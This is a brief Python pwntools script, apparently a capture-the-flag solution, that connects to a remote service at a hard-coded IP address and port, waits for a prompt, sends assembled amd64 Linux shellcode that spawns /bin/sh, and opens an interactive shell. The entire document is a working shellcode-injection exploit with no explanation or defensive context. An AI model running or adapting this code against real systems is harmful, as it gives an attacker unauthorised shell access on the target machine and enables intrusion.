from pwn import *

proc=remote("34.134.85.196",5337)
print(proc.recvuntil("below").decode())



context.update(arch='amd64', os='linux')

shellcode = shellcraft.sh()
print(shellcode)
proc.sendline(asm(shellcode))
proc.interactive()
